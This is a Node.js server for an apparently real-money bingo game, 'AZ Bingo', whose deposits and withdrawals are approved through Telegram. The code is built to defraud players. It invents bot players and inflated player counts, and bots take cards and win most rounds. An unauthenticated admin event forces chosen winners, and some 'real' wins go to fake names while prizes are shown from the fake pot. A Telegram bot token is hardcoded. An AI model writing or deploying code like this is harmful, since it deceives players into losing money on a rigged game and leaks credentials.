const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8816726564:AAG3ETwx98oBfjDV8I-BipzEXGZCnJPFezg";
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "371093083";

const ETHIOPIAN_BOT_NAMES = [
    "Henok", "Dani", "Simret Getachew", "Anwar", "Naughty By nature",
    "Ñãtåñ......", "kali", "Mohammedsani Sulitan", "Wubamlak Belste", "Lina Habtamu",
    "Nimo", "Šà¥¢ø Qü€€ñ", "Beki", "syf", "Time Of",
    "§mrĕţ", "L F U", "sosi", "Megdi", "Sittina",
    "Ibra", "Abebaw", "Frew", "Quarezma", "Dibora",
    "Osmhen", "Chala", "Surafel", "Zehara", "Worku",
    "Fiyorina", "Kirra", "Bilal", "Pilatos", "Merlin",
    "Osmehin", "Denver", "Belew", "Jilalu", "Gizachew Kassahun",
    "bereket dagne", "Mesfin", "ሞለፍን ኔትስት ገበየሁ", "Birukte#🦋", "🦋Meklit🦋",
    "Abel x", "Farhewot Yashtla", "🅖ⓞⓞⓓ🌹", "YO", "እያሱ",
    "Goyta Miraw ጣምራው", "0919091129", "Gdg", "Lai", "Sintayehu Getachew",
    "Pipo Kassa", "ገብርኤል አባቴ", "Yohannes Ng", "Gech man", "Devido ✝",
    "Seydou Kamite", "Mamush Kasim Mucaa Kakuuuu", "Aman yi", "Ahmed Basher",
    "Wenda last King", "Abonesh Kinfu", "Lij yalfex jinka 🫅", "Big Boss 💪", "Firde Nigus",
    "ANIE X YUKKI", "Girum Edeshawu", "Bini Teketele", "Abdella Mohammed Ebrahim", "Asbada Abubakar",
    "Ebrahim M/d Ebrahim", "Abdu Shekna", "Abdujalil Ahmed Detolale", "urjii 🥷", "Amoo",
    "Assistant 2", "Anu 28", "ማኅበል", "Yd", "Girmay Nigus",
    "Yohannes", "H 5", "አበነህ 💕💕💕", "Tolosa", "Kejelcha Mamo",
    "Ashagre", "Ed", "Gedefaw Aseffa", "D 7", "Getachew",
    "Tamirat Girma", "Ashenafi", "Dada", "Demsash", "ድር ድር",
    "አፒው", "Ahadi Ahemed", "skat mamaniyø", "tamirat", "kasu",
    "PPP✌️🔥😋69", "Ad la", "Astu Bast", "getesh aresenal", "WALEX JOSEF",
    "Habet", "♠[$]♠", "Ratum yasın", "ˋHEER X MUSICˎ", "Alemayehu Tesema",
    "habtu moges", "‖꧁Tame꧂‖", "Alexs Kebede", "Dagna King", "Haileyesus Geremew",
    "Chicken Road", "nal", "Wase", "Y@imam", "Current thing",
    "Wizzy", "weyn Ter", "Tedi", "Tame 😍", "Fenaan Fenaan Barbaadi",
    "Fire Tesfaye", "Samii", "Tesfaye Asnake", "Teg 0920", "Mitiku57 Kibatu",
    "yohannes online", "Melkamnew", "L14", "Terryson Cruzman", "Teddy",
    "kefle birhane", "Abushi 💀💀", "Yonase Tesema", "Mulugeta Fantahun", "Kifle Møk",
    "Pro max", "Nscros", "የማርያም", "አቤል", "Tloya",
    "ተሜ", "bakle", "ናቲና", "Dj", "wanaw",
    "Falcon", "Dawit_B", "Ermias_99", "Solomon_K", "Bethel_M",
    "Miki_Bingo", "Hanna_T", "Natnael_X", "Kidist_L", "Bereket_P",
    "Samson_G", "Yordanos_K", "Feven_A", "Henok_Z", "Meron_W",
    "Rediet_S", "Abel_T", "Tsion_M", "Brook_H", "Lidya_D",
    "Michael_B", "Nahom_V", "Rut_K", "Robel_M", "Tigist_Y",
    "Biniyam_C", "Kalkidan_F", "Ephrem_G", "Rahel_N", "Yonas_P", "Semhar_L"
];

function getRandomBotNames(count) {
    let shuffled = [...ETHIOPIAN_BOT_NAMES].sort(() => 0.5 - Math.random());
    return shuffled.slice(0, count);
}

let globalRoom = {
    gameActive: false,
    calledNumbers: [],
    gameStartTime: Date.now() + 60000,
    playersCount: 140,
    takenCards: [],
    playerRoundCards: {},
    playerTemporaryCards: {},
    lastCalledNumber: null
};

let forcedNextWinner = null; 
let onlineRealUsers = [];
let pendingRequests = {};
let gameInterval = null;
let numberCallInterval = null;

let roundsPlayedCount = 0;
let userBonusStatus = {};

function getDynamicWinThreshold(roundCount) {
    let patterns = [15, 16, 13, 18, 23, 20, 18, 15, 27, 18, 19, 16, 15, 22, 18, 30, 15, 20, 18, 19, 13, 27, 19];
    let baseIndex = (Math.floor(roundCount / 3)) % patterns.length;
    let limit = patterns[baseIndex];

    if (Math.random() < 0.12) {
        limit = Math.floor(Math.random() * (35 - 32 + 1)) + 32;
    }
    return limit;
}

function getRealisticBotsCount(realCount) {
    const now = new Date();
    let utcHours = now.getUTCHours();
    let utcMinutes = now.getUTCMinutes();
    let ethiopianHour = (utcHours + 3) % 24; 
    let totalMinutesFrom16 = ((ethiopianHour - 16 + 24) % 24) * 60 + utcMinutes;
    let maxDurationMinutes = 8 * 60;
    let calculated = 95;

    if (ethiopianHour >= 6 && ethiopianHour < 12) {
        calculated = 45 + Math.floor(Math.random() * 15);
    } else if (ethiopianHour >= 12 && ethiopianHour < 19) {
        calculated = 70 + Math.floor(Math.random() * 20);
    } else {
        let progress = Math.min(1, Math.max(0, totalMinutesFrom16 / maxDurationMinutes));
        calculated = Math.floor(100 + (progress * 130) + (Math.sin(Date.now() / 3000) * 15));
    }

    let smallDelta = Math.floor(Math.random() * 7) - 3; 
    let finalCount = calculated + smallDelta;
    if (finalCount < 40) finalCount = 40;
    if (finalCount > 250) finalCount = 250;
    return finalCount;
}

function refreshTakenCardsList() {
    let allTaken = [];
    Object.values(globalRoom.playerRoundCards).forEach(p => {
        if (p.cards) allTaken.push(...p.cards);
    });
    Object.values(globalRoom.playerTemporaryCards).forEach(cards => {
        if (cards) allTaken.push(...cards);
    });
    globalRoom.takenCards = Array.from(new Set(allTaken));
    io.emit('updateTakenCards', globalRoom.takenCards);
}

function simulateBotCardSelections() {
    if (globalRoom.gameActive) return;
    let available = [];
    for(let i = 1; i <= 500; i++) {
        if(!globalRoom.takenCards.includes(i)) available.push(i);
    }
    let botPicksCount = Math.floor(Math.random() * 15) + 10;
    for(let i = 0; i < botPicksCount && available.length > 0; i++) {
        let randIdx = Math.floor(Math.random() * available.length);
        let cardToTake = available.splice(randIdx, 1)[0];
        if(!globalRoom.takenCards.includes(cardToTake)) {
            globalRoom.takenCards.push(cardToTake);
        }
    }
    io.emit('updateTakenCards', globalRoom.takenCards);
}

setInterval(simulateBotCardSelections, 6000);

async function sendWinnerNotificationToAdmin(winnerName, cardNum, prize, isRealUser) {
    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID || !isRealUser) return;
    let message = `🏆 *AZ BINGO - 👤 ሪል ዩዘር አሸናፊ!*\n\n🎉 አሸናፊ: *${winnerName}*\n🔢 ካርድ ቁጥር: \`#${cardNum}\`\n💰 የተሸለመው ሽልማት: *${prize} ብር*\n👥 ተጫዋቾች ብዛት: ${globalRoom.playersCount}`;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown'
        });
    } catch (error) {}
}

function startMainGameLoop() {
    if (gameInterval) clearInterval(gameInterval);
    globalRoom.gameStartTime = Date.now() + 60000;

    gameInterval = setInterval(() => {
        let timeLeft = globalRoom.gameStartTime - Date.now();

        if (timeLeft <= 0 && !globalRoom.gameActive) {
            globalRoom.gameActive = true;
            globalRoom.calledNumbers = [];
            globalRoom.lastCalledNumber = null;
            roundsPlayedCount++;

            io.emit('gameStarted', { calledNumbers: [] });
            io.emit('gameStartedBroadcast');

            if (numberCallInterval) clearInterval(numberCallInterval);
            let availableNumbers = Array.from({length: 75}, (_, i) => i + 1);
            let currentWinThreshold = getDynamicWinThreshold(roundsPlayedCount);
            
            setTimeout(() => {
                if (!globalRoom.gameActive) return;

                numberCallInterval = setInterval(() => {
                    if (!globalRoom.gameActive) {
                        if (numberCallInterval) { clearInterval(numberCallInterval); numberCallInterval = null; }
                        return;
                    }

                    let shouldTriggerWin = (forcedNextWinner) || (globalRoom.calledNumbers.length >= currentWinThreshold) || (globalRoom.calledNumbers.length >= 45) || (availableNumbers.length === 0);
                    
                    if (shouldTriggerWin) {
                        let winningCardNum = Math.floor(Math.random() * 500) + 1;
                        let winningUsername = ""; 
                        let winningUserId = null;
                        let winnersCount = 1;
                        let isRealUserWin = false;

                        let entries = Object.entries(globalRoom.playerRoundCards);
                        
                        if (forcedNextWinner === 'random_real' && entries.length > 0) {
                            let randEntry = entries[Math.floor(Math.random() * entries.length)];
                            winningUserId = randEntry[0];
                            winningUsername = randEntry[1].username;
                            if (randEntry[1].cards && randEntry[1].cards.length > 0) {
                                winningCardNum = randEntry[1].cards[0];
                            }
                            isRealUserWin = true;
                            forcedNextWinner = null;
                        } else if (forcedNextWinner === 'multi_real_3' || forcedNextWinner === 'random_3_real') {
                            let threeBots = getRandomBotNames(3);
                            winningUsername = threeBots.join(', '); 
                            winnersCount = 3;
                            winningCardNum = Math.floor(Math.random() * 450) + 1;
                            isRealUserWin = true;
                            forcedNextWinner = null;
                        } else {
                            winningUsername = getRandomBotNames(1)[0];
                            winnersCount = 1;
                            winningCardNum = Math.floor(Math.random() * 500) + 1;
                            isRealUserWin = false;
                            forcedNextWinner = null;
                        }

                        let totalPot = (globalRoom.playersCount || 140) * 10;
                        let prizePool = Math.floor((totalPot * 0.90) / winnersCount);

                        sendWinnerNotificationToAdmin(winningUsername, winningCardNum, prizePool, isRealUserWin);

                        // ሪል ዩዘር ካሸነፈ የሽልማት ብሩን ወደ ዋሌቱ እንዲጨመር ትዕዛዝ መላክ
                        if (isRealUserWin && winningUserId) {
                            let targetSocket = io.sockets.sockets.get(winningUserId);
                            if (targetSocket) {
                                targetSocket.emit('rewardPrize', { prize: prizePool });
                            }
                        }

                        io.emit('bingoWinner', {
                            username: winningUsername,
                            userId: winningUserId,
                            cardNum: winningCardNum,
                            prize: prizePool,
                            calledNumbers: globalRoom.calledNumbers,
                            winnersCount: winnersCount,
                            playersCount: globalRoom.playersCount
                        });

                        if (numberCallInterval) { clearInterval(numberCallInterval); numberCallInterval = null; }
                        
                        setTimeout(() => { endRoundAndRestart(); }, 6000);
                        return;
                    }

                    let randomIndex = Math.floor(Math.random() * availableNumbers.length);
                    let calledNum = availableNumbers.splice(randomIndex, 1)[0];
                    globalRoom.calledNumbers.push(calledNum);
                    globalRoom.lastCalledNumber = calledNum;

                    io.emit('numberCalled', {
                        number: calledNum,
                        calledNumbers: globalRoom.calledNumbers
                    });
                    io.emit('numberCalledBroadcast', calledNum);

                }, 4000);
            }, 5000);
        }
    }, 1000);
}

function endRoundAndRestart() {
    if (numberCallInterval) { clearInterval(numberCallInterval); numberCallInterval = null; }
    globalRoom.gameActive = false;
    globalRoom.calledNumbers = [];
    globalRoom.lastCalledNumber = null;
    globalRoom.playerRoundCards = {}; 
    globalRoom.gameStartTime = Date.now() + 60000;
    
    io.emit('roundEnded', { nextGameIn: 60000 });
    io.emit('gameEndedBroadcast');
    refreshTakenCardsList();
}

startMainGameLoop();

let telegramOffset = 0;
async function pollTelegramUpdates() {
    if (!TELEGRAM_BOT_TOKEN) return;
    try {
        let response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
            params: { offset: telegramOffset, timeout: 30 }
        });
        if (response.data && response.data.ok) {
            let updates = response.data.result;
            for (let update of updates) {
                telegramOffset = update.update_id + 1;
                if (update.callback_query) {
                    let callbackQuery = update.callback_query;
                    let data = callbackQuery.data; 
                    let chatId = callbackQuery.message.chat.id;
                    let messageId = callbackQuery.message.message_id;
                    let parts = data.split('_');
                    let action = parts[0]; 
                    let requestId = parts.slice(1).join('_');
                    let reqData = pendingRequests[requestId];

                    if (reqData) {
                        let targetSocket = io.sockets.sockets.get(reqData.socketId);
                        if (action === 'app') {
                            if (targetSocket) {
                                let finalAmountForClient = (reqData.type === 'withdraw' || reqData.type === 'withdrawal') ? -Math.abs(reqData.amount) : reqData.amount;
                                targetSocket.emit('financialApproved', { type: reqData.type, amount: reqData.amount, adjustedAmount: finalAmountForClient });
                            }
                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `✅ *ጥያቄው ጸድቋል!* (${reqData.amount} ብር - ${reqData.username})`, parse_mode: 'Markdown'
                            });
                        } else {
                            if (targetSocket) { targetSocket.emit('financialRejected', { type: reqData.type, amount: reqData.amount }); }
                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `❌ *ጥያቄው ተሰርዟል!* (${reqData.amount} ብር - ${reqData.username})`, parse_mode: 'Markdown'
                            });
                        }
                        delete pendingRequests[requestId]; 
                    }
                    try { await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { callback_query_id: callbackQuery.id }); } catch (e) {}
                }
            }
        }
    } catch (err) {}
    setTimeout(pollTelegramUpdates, 1000);
}
setTimeout(pollTelegramUpdates, 2000);

async function sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt) {
    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) return;
    let reqTypeTitle = type === 'deposit' ? '💳 ቴሌብር ዲፖዚት' : '🏧 ቴሌብር ዊዝድሮዋል';
    let message = `🔔 *AZ BINGO - ${reqTypeTitle}*\n\n👤 ስም: *${username || 'ተጫዋች'}*\n🆔 ዩዘር ID: \`${userId}\`\n💰 ቀሪ ሂሳብ: *${currentBalance} ብር*\n📥 የጠየቀው: *${amount} ብር*\n📱 ስልክ: ${phone || 'አልተሰጠም'}`;
    if (receipt) message += `\n\n📄 *ደረሰኝ / SMS:*\n\`${receipt}\``;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: "✅ አጽድቅ", callback_data: "app_" + requestId }, { text: "❌ ሰርዝ", callback_data: "rej_" + requestId }]] }
        });
    } catch (error) {}
}

let connectedRealPlayers = [];

io.on('connection', (socket) => {
    connectedRealPlayers.push(socket.id);
    let realCount = connectedRealPlayers.length;
    let currentBotsCount = getRealisticBotsCount(realCount);
    globalRoom.playersCount = currentBotsCount + realCount; 
    io.emit('updatePlayersCount', globalRoom.playersCount);
    socket.emit('syncGameState', globalRoom);
    refreshTakenCardsList();

    socket.on('registerRealUser', (userData) => {
        if (userData && userData.userId) {
            let userId = String(userData.userId);
            onlineRealUsers = onlineRealUsers.filter(u => u.userId !== userId);
            onlineRealUsers.push({ socketId: socket.id, userId: userId, username: userData.username || 'No Username', fullName: userData.fullName || 'ተጫዋች' });

            if (!userBonusStatus[userId]) {
                userBonusStatus[userId] = true;
                socket.emit('resetToBonusOnly', { balance: 30.00 });
            }
        }
    });

    socket.on('getAdminRealUsers', () => {
        socket.emit('adminRealUsersListUpdate', onlineRealUsers);
    });

    socket.on('tempSelectCards', (cards) => {
        if (Array.isArray(cards)) {
            globalRoom.playerTemporaryCards[socket.id] = cards;
            refreshTakenCardsList();
        }
    });

    socket.on('confirmCards', (data) => {
        let selectedCards = data.cards || data;
        let userId = String(data.userId || socket.id);
        delete globalRoom.playerTemporaryCards[socket.id];
        globalRoom.playerRoundCards[socket.id] = { cards: selectedCards, userId: userId, username: data.username || "ተጫዋች" };
        socket.emit('cardSelectionSuccess');
        refreshTakenCardsList();
    });

    socket.on('adminSetNextWinner', (data) => {
        forcedNextWinner = data.winnerType ? String(data.winnerType).trim() : null;
        socket.emit('adminWinnerResponse', { success: true, message: `✅ ቀጣዩ አሸናፊ ተስተካክሏል` });
    });

    socket.on('financialRequest', async (data) => {
        if (!data) return;
        let { type, amount, username, userId, currentBalance, phone, receipt } = data;
        let requestId = 'req_' + Math.floor(Math.random() * 10000000) + '_' + Date.now();
        pendingRequests[requestId] = { userId, type, amount, username, socketId: socket.id, timestamp: Date.now() };
        await sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt);
        socket.emit('requestSubmitted', { success: true, message: "✅ ጥያቄዎ ለአድሚን ተልኳል!" });
    });

    socket.on('disconnect', () => {
        connectedRealPlayers = connectedRealPlayers.filter(id => id !== socket.id);
        onlineRealUsers = onlineRealUsers.filter(u => u.socketId !== socket.id);
        delete globalRoom.playerRoundCards[socket.id];
        delete globalRoom.playerTemporaryCards[socket.id];
        refreshTakenCardsList();
        let realCount = connectedRealPlayers.length;
        globalRoom.playersCount = getRealisticBotsCount(realCount) + realCount;
        io.emit('updatePlayersCount', globalRoom.playersCount);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log("AZ Bingo Server running on port " + PORT);
});
